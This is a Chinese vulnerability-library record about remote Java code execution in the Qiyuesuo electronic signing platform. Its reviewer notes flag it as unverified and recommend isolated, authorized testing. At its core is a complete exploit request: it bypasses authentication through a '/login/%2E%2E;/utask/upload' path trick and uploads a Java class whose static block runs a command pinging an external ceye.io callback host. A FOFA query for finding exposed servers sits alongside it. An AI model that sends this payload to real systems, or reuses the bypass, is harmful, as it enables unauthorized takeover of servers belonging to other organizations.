---
source: "wy876 漏洞文库"
title: "契约锁电子签署平台 utask/upload任务Java代码执行"
product: "契约锁电子签署平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "BaseTimerTask编译/加载机制、版本未知"
prerequisites: "login/%2E%2E;绕过声明"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态；在线解密或外部服务可能收到凭据及敏感内容"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/cxxpice0g3tk68ed"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A5%91%E7%BA%A6%E9%94%81/%E5%A5%91%E7%BA%A6%E9%94%81utask%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"契约锁-电子签署平台\""
id: "vw-c2732f7e39f8e8b1001b3f4e"
entity_id: "ve-c2732f7e39f8e8b1001b3f4e"
schema_version: "1"
---

# 契约锁电子签署平台 utask/upload任务Java代码执行

## 条目说明

- 对象与具体问题：契约锁电子签署平台；utask/upload任务Java代码执行
- 版本、配置及部署条件：BaseTimerTask编译/加载机制、版本未知
- 认证与权限前提：login/%2E%2E;绕过声明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 文件名qys.jpg而内容public class qiyuesuo004，需解释服务器编译/改名及触发加载时机，不能按普通Java编译假设直接成功
- type TIMETASK为必要业务条件；静态初始化执行ping需类加载，未给响应/出站证据
- 第三方ceye域名应换受控占位符，上传/任务创建有状态影响

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态；在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
Qiyuesuo是一款数字化可信基础服务平台，为组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字化可信基础解决方案。Qiyuesuo存在前台代码执行漏洞，攻击者可构造恶意请求绕过相关认证调用后台功能造成远程代码执行，控制服务器。

## 二、影响版本
+ 契约锁

## 三、资产测绘
+ fofa`app="契约锁-电子签署平台"`
+ 特征


## 四、漏洞复现
```http
POST /login/%2E%2E;/utask/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Accept-Encoding: gzip


------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="type";

TIMETASK
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R
Content-Disposition: form-data; name="file";filename="qys.jpg"

package qiyuesuo;

import com.qiyuesuo.utask.java.BaseTimerTask;

public class qiyuesuo004 extends BaseTimerTask {
    static {try{Runtime.getRuntime().exec("ping grewuo.ceye.io");}catch (Exception e){}}
}
------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--
```

> 请求长度说明：原资料 Content-Length 为 498；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cxxpice0g3tk68ed>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
